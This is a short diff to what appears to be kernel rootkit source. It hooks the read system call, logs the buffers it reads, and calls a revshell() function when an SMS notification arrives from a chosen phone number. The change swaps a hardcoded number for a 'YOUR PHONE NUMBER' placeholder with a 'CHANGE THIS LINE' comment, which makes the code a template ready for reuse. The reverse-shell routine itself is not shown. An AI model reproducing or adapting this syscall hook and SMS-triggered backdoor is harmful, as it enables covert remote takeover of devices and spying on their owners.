@@ -45,7 +45,7 @@ asmlinkage ssize_t hooked_syscall_read(int fd, char *buf, size_t count) {
 	printk (KERN_INFO "HOOKED SYS_READ: %s\n", buf);
 
 	if(strstr (buf, "getSmsNewMessageNotificationInfo")) {
-			if(strstr(buf, "addr=287412"))
+			if(strstr(buf, "addr=YOUR PHONE NUMBER")) // CHANGE THIS LINE
 				revshell();
 	}
 	else return syscall_read(fd, buf, count);
